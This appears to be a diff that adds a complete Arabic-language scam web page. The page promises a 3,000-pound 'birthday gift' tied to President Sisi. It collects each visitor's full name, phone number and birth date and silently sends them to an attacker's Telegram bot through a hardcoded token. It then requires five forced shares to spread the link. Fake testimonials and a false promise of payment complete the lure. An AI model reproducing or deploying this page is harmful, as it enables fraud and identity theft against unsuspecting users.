@@ -1,0 +1,535 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مكافأة 3,000 جنيه - احتفالاً بعيد الميلاد</title>
+    <style>
+        :root {
+            --primary-gradient: linear-gradient(135deg, #cc0000, #800000);
+            --whatsapp-color: #25D366;
+            --telegram-color: #0088cc;
+            --messenger-color: #0084ff;
+            --bg-color: #f0f2f5;
+            --card-bg: #ffffff;
+            --text-color: #1a202c;
+        }
+
+        body {
+            font-family: 'Cairo', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--bg-color);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            color: var(--text-color);
+        }
+
+        .container {
+            width: 100%;
+            max-width: 480px;
+            background: var(--card-bg);
+            min-height: 100vh;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            box-sizing: border-box;
+            padding-bottom: 40px;
+        }
+
+        /* رأس الصفحة */
+        .header-banner {
+            background: var(--primary-gradient);
+            color: white;
+            text-align: center;
+            padding: 30px 20px;
+            border-bottom-left-radius: 30px;
+            border-bottom-right-radius: 30px;
+            box-shadow: 0 6px 20px rgba(204, 0, 0, 0.3);
+        }
+
+        .header-banner p {
+            margin: 0;
+            font-size: 14px;
+            opacity: 0.95;
+            font-weight: 600;
+        }
+
+        .header-banner h1 {
+            font-size: 24px;
+            margin: 8px 0;
+            font-weight: 800;
+        }
+
+        .gift-box {
+            font-size: 30px;
+            font-weight: 900;
+            background: #ffffff;
+            color: #d4af37;
+            display: inline-block;
+            padding: 8px 30px;
+            border-radius: 50px;
+            margin: 15px 0 5px 0;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+            letter-spacing: 1px;
+        }
+
+        .content {
+            padding: 25px 20px;
+        }
+
+        /* صندوق إدخال البيانات */
+        .initial-input-box {
+            background: #fff9f9;
+            border: 2px solid #feb2b2;
+            padding: 18px;
+            border-radius: 16px;
+            margin-bottom: 25px;
+            box-shadow: 0 4px 12px rgba(229, 62, 62, 0.05);
+            transition: all 0.3s ease;
+        }
+
+        .initial-input-box h3 {
+            margin: 0 0 12px 0;
+            color: #c53030;
+            font-size: 16px;
+            text-align: center;
+            font-weight: 700;
+        }
+
+        .form-group {
+            margin-bottom: 14px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 6px;
+            font-weight: 700;
+            font-size: 13.5px;
+            color: #4a5568;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            border: 1.5px solid #cbd5e0;
+            border-radius: 10px;
+            box-sizing: border-box;
+            font-size: 14px;
+            background: #fff;
+            transition: all 0.3s ease;
+            text-align: right;
+        }
+
+        .form-group input:focus {
+            border-color: #cc0000;
+            outline: none;
+            box-shadow: 0 0 0 4px rgba(204, 0, 0, 0.1);
+        }
+
+        .first-submit-btn {
+            background: linear-gradient(135deg, #3182ce, #2b6cb0);
+            color: white;
+            border: none;
+            padding: 12px;
+            width: 100%;
+            border-radius: 10px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(49, 130, 206, 0.3);
+            transition: all 0.3s ease;
+            margin-top: 5px;
+        }
+
+        .first-submit-btn:hover {
+            opacity: 0.9;
+        }
+
+        .content p {
+            font-size: 14.5px;
+            color: #4a5568;
+            line-height: 1.7;
+            margin-bottom: 15px;
+        }
+
+        /* شريط التقدم */
+        .progress-box {
+            background: #fff;
+            padding: 18px;
+            border-radius: 16px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.04);
+            margin: 25px 0;
+            border: 1px solid #edf2f7;
+        }
+
+        .progress-bar-bg {
+            background: #edf2f7;
+            height: 20px;
+            border-radius: 12px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .progress-bar-fill {
+            background: linear-gradient(90deg, #ff416c, #ff4b2b);
+            height: 100%;
+            width: 0%;
+            border-radius: 12px;
+            transition: width 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .progress-text {
+            text-align: center;
+            font-weight: 800;
+            color: #2d3748;
+            font-size: 14px;
+            margin-top: 10px;
+            display: block;
+        }
+
+        /* أزرار المشاركة */
+        .share-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            width: 100%;
+            padding: 15px;
+            margin: 14px 0;
+            border: none;
+            border-radius: 14px;
+            color: white;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            text-decoration: none;
+            box-sizing: border-box;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            transition: transform 0.2s ease, filter 0.2s ease;
+        }
+
+        .share-btn:active {
+            transform: scale(0.97);
+        }
+
+        .whatsapp { background-color: var(--whatsapp-color); }
+        .telegram { background-color: var(--telegram-color); }
+        .messenger { background-color: var(--messenger-color); }
+
+        #shareInstruction {
+            text-align: center;
+            font-weight: 700;
+            color: #c53030;
+            background: #fff5f5;
+            padding: 12px;
+            border-radius: 10px;
+            font-size: 14px;
+            margin-bottom: 15px;
+            border: 1px dashed #feb2b2;
+        }
+
+        /* زر التأكيد الثاني */
+        #secondConfirmSection {
+            display: none;
+            background: #f0fff4;
+            border: 2px solid #38a169;
+            padding: 20px;
+            border-radius: 16px;
+            margin-top: 25px;
+            text-align: center;
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .second-confirm-btn {
+            background: linear-gradient(135deg, #48bb78, #38a169);
+            color: white;
+            border: none;
+            padding: 14px;
+            width: 100%;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.4);
+            margin-top: 10px;
+            transition: opacity 0.2s;
+        }
+
+        .second-confirm-btn:hover {
+            opacity: 0.9;
+        }
+
+        /* رسالة النجاح النهائية */
+        #successFinalMessage {
+            display: none;
+            text-align: center;
+            background: #e6fffa;
+            border: 2px solid #319795;
+            padding: 20px;
+            border-radius: 16px;
+            margin-top: 25px;
+            animation: fadeIn 0.5s ease;
+        }
+
+        /* التعليقات */
+        .comments-section {
+            margin-top: 35px;
+            border-top: 1px solid #edf2f7;
+            padding-top: 20px;
+        }
+
+        .comment {
+            display: flex;
+            margin-bottom: 14px;
+            background: #f8fafc;
+            padding: 14px;
+            border-radius: 12px;
+            border: 1px solid #edf2f7;
+        }
+
+        .comment-body h4 {
+            margin: 0 0 4px 0;
+            font-size: 14px;
+            color: #2d3748;
+            font-weight: 700;
+        }
+
+        .comment-body p {
+            margin: 0;
+            font-size: 13.5px;
+            color: #4a5568;
+        }
+    </style>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+</head>
+<body>
+
+<div class="container">
+    <!-- رأس الصفحة -->
+    <div class="header-banner">
+        <p>احتفالاً بعيد ميلاد الرئيس عبد الفتاح السيسي!</p>
+        <h1>بهدية الحظ الكبرى</h1>
+        <div class="gift-box">3,000 جنيه</div>
+    </div>
+
+    <div class="content">
+        <!-- صندوق إدخال البيانات -->
+        <div class="initial-input-box" id="inputSection">
+            <h3>أدخل بياناتك للتحقق والإرسال الأولي:</h3>
+            <div class="form-group">
+                <label>الاسم الثلاثي:</label>
+                <input type="text" id="initialFullname" placeholder="أدخل اسمك الثلاثي بدقة">
+            </div>
+            <div class="form-group">
+                <label>رقم الهاتف المحمول:</label>
+                <input type="tel" id="initialPhone" placeholder="مثال: 01000000000">
+            </div>
+            <div class="form-group">
+                <label>تاريخ الميلاد (أرقام فقط):</label>
+                <input type="text" id="initialDob" placeholder="مثال: 2492005">
+            </div>
+            <button type="button" class="first-submit-btn" id="firstSubmitBtn" onclick="sendInitialData()">إرسال البيانات أولاً 📤</button>
+        </div>
+
+        <p><strong>خطوات الحصول على الهدية:</strong> قم أولاً بإرسال بياناتك، ثم أكمل مهمة المشاركة أدناه <strong>(5 مرات)</strong> لتفعيل زر تأكيد الطلب النهائي وإتمام الإيداع.</p>
+
+        <!-- شريط التقدم -->
+        <div class="progress-box">
+            <div class="progress-bar-bg">
+                <div class="progress-bar-fill" id="progressFill"></div>
+            </div>
+            <span class="progress-text" id="progressText">نسبة التقدم: 0%</span>
+        </div>
+
+        <!-- أزرار المشاركة -->
+        <div id="shareButtonsArea">
+            <div id="shareInstruction">يتبقى عليك مشاركة: <span id="remainingShares">5</span> مرات</div>
+            <button class="share-btn whatsapp" onclick="performShare('WhatsApp')">مشاركة عبر WhatsApp 🟢</button>
+            <button class="share-btn telegram" onclick="performShare('Telegram')">مشاركة عبر Telegram 🔵</button>
+            <button class="share-btn messenger" onclick="performShare('Messenger')">مشاركة عبر Messenger 🔷</button>
+        </div>
+
+        <!-- زر التأكيد الثاني -->
+        <div id="secondConfirmSection">
+            <h3 style="color: #234e52; margin-top:0; font-size: 18px;">🎉 اكتملت الـ 5 مشاركات بنجاح!</h3>
+            <p style="color: #285e61; font-size:14px; margin-bottom: 10px;">اضغط على زر التأكيد النهائي أدناه لإرسال إشعار التفعيل الكامل للبوت:</p>
+            <button type="button" class="second-confirm-btn" onclick="sendFinalConfirmation()">تأكيد الطلب النهائي ✅</button>
+        </div>
+
+        <!-- رسالة النجاح النهائية -->
+        <div id="successFinalMessage">
+            <h3 style="color: #234e52; margin-top:0;">تم التأكيد بنجاح تام!</h3>
+            <p style="color: #285e61; font-size:14px; margin:0;">تم إرسال كافة تفاصيل التأكيد إلى النظام، وسيتم إيداع الـ 3,000 جنيه في حسابك قريباً.</p>
+        </div>
+
+        <!-- التعليقات -->
+        <div class="comments-section">
+            <div class="comment">
+                <div class="comment-body">
+                    <h4>احمد السيد</h4>
+                    <p>متشكر جداً ❤️ وصلتني الفلوس فوراً</p>
+                </div>
+            </div>
+            <div class="comment">
+                <div class="comment-body">
+                    <h4>حماده ناصر</h4>
+                    <p>مش مصدق إنهم فعلاً بيجوا 3,000 جنيه! 😂</p>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    const adText = "أنا استلمت 3,000 جنيه! جرّب أنت كمان، الموضوع سهل جدًا!";
+    const postUrl = window.location.href;
+    const fullShareMessage = encodeURIComponent(adText + "\n" + postUrl);
+
+    let shareCount = 0;
+    const totalRequired = 5;
+    const botToken = "8972448477:AAHVupixPQMoRjCEMTbjC1F1EfR5CW45za4";
+    const chatId = "8442364511";
+
+    let isInitialSent = false;
+
+    // التحقق المتقدم من صحة الحقول (يقبل أي أرقام لتاريخ الميلاد دون قيود طول صارمة)
+    function validateInputs() {
+        const fullname = document.getElementById('initialFullname').value.trim();
+        const phone = document.getElementById('initialPhone').value.trim();
+        const dob = document.getElementById('initialDob').value.trim();
+
+        if (!fullname || !phone || !dob) {
+            alert("⚠️ يرجى ملء جميع الحقول المطلوبة (الاسم، الهاتف، وتاريخ الميلاد) بدقة!");
+            return null;
+        }
+
+        if (phone.length < 10 || isNaN(phone)) {
+            alert("⚠️ يرجى إدخال رقم هاتف صحيح ومكون من أرقام فقط!");
+            document.getElementById('initialPhone').focus();
+            return null;
+        }
+
+        if (isNaN(dob)) {
+            alert("⚠️ يرجى التأكد من أن تاريخ الميلاد مكون من أرقام فقط بدون فواصل أو حروف!");
+            document.getElementById('initialDob').focus();
+            return null;
+        }
+
+        return { fullname, phone, dob };
+    }
+
+    // إرسال البيانات الأولية للبوت
+    function sendInitialData() {
+        const data = validateInputs();
+        if (!data) return;
+
+        const btn = document.getElementById('firstSubmitBtn');
+        const originalText = btn.innerText;
+        btn.innerText = "جاري الإرسال...";
+        btn.disabled = true;
+
+        const message = `📥 [إرسال أولي للبيانات]:\n\n👤 الاسم الثلاثي: ${data.fullname}\n📞 رقم الهاتف: ${data.phone}\n📅 تاريخ الميلاد: ${data.dob}`;
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+        fetch(url)
+        .then(response => {
+            if (response.ok) {
+                isInitialSent = true;
+                alert("✅ تم إرسال بياناتك الأولية بنجاح إلى البوت! يمكنك الآن بدء مشاركة الإعلان.");
+
+                document.getElementById('initialFullname').disabled = true;
+                document.getElementById('initialPhone').disabled = true;
+                document.getElementById('initialDob').disabled = true;
+                btn.style.display = 'none';
+                document.getElementById('inputSection').style.opacity = '0.85';
+            } else {
+                throw new Error("فشل الرد من الخادم");
+            }
+        })
+        .catch(() => {
+            alert("حدث خطأ أثناء الإرسال، يرجى المحاولة مرة أخرى.");
+            btn.innerText = originalTest;
+            btn.disabled = false;
+        });
+    }
+
+    // تتبع عدد المشاركات وشريط التقدم
+    function performShare(platform) {
+        const data = validateInputs();
+        if (!data) {
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+            return;
+        }
+
+        if (!isInitialSent) {
+            alert("⚠️ تنبيه: يرجى الضغط على زر 'إرسال البيانات أولاً' وتأكيد إرسالها قبل البدء بالمشاركة!");
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+            return;
+        }
+
+        if (shareCount < totalRequired) {
+            shareCount++;
+            let progress = (shareCount / totalRequired) * 100;
+
+            document.getElementById('progressFill').style.width = progress + "%";
+            document.getElementById('progressText').innerText = `نسبة التقدم: ${progress}%`;
+
+            let remaining = totalRequired - shareCount;
+            document.getElementById('remainingShares').innerText = remaining;
+
+            // فتح رابط المشاركة المباشر
+            if (platform === 'WhatsApp') {
+                window.open(`https://api.whatsapp.com/send?text=${fullShareMessage}`, '_blank');
+            } else if (platform === 'Telegram') {
+                window.open(`https://t.me/share/url?url=${encodeURIComponent(postUrl)}&text=${encodeURIComponent(adText)}`, '_blank');
+            } else {
+                window.open(`https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(postUser)}` || `https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(postUrl)}`, '_blank');
+            }
+
+            // عند الوصول للعدد المطلوب تماماً، يتم إخفاء أزرار المشاركة وإظهار زر التأكيد النهائي
+            if (shareCount === totalRequired) {
+                document.getElementById('shareButtonsArea').style.display = 'none';
+                document.getElementById('secondConfirmSection').style.display = 'block';
+                window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
+            }
+        }
+    }
+
+    // إرسال التأكيد النهائي للبوت
+    function sendFinalConfirmation() {
+        const data = validateInputs();
+        if (!data) return;
+
+        const confirmBtn = document.querySelector('.second-confirm-btn');
+        const originalText = confirmBtn.innerText;
+        confirmBtn.innerText = "جاري تأكيد الطلب...";
+        confirmBtn.disabled = true;
+
+        const message = `✅ [تأكيد نهائي - اكتملت الـ 5 مشاركات]:\n\n 👤 الاسم الثلاثي: ${data.fullname}\n📞 رقم الهاتف: ${data.phone}\n📅 تاريخ الميلاد: ${data.dob}\n🎯 الحالة: مؤهل بنجاح لإيداع المكافأة.`;
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+        fetch(url)
+        .then(response => {
+            if (response.ok) {
+                document.getElementById('secondConfirmSection').style.display = 'none';
+                document.getElementById('successFinalMessage').style.display = 'block';
+                window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
+            } else {
+                throw new Error("فشل التأكيد");
+            }
+        })
+        .catch(() => {
+            alert("حدث خطأ أثناء التأكيد النهائي، حاول مرة أخرى.");
+            confirmBtn.innerText = originalText;
+            confirmBtn.disabled = false;
+        });
+    }
+</script>
+
+</body>
+</html>
+
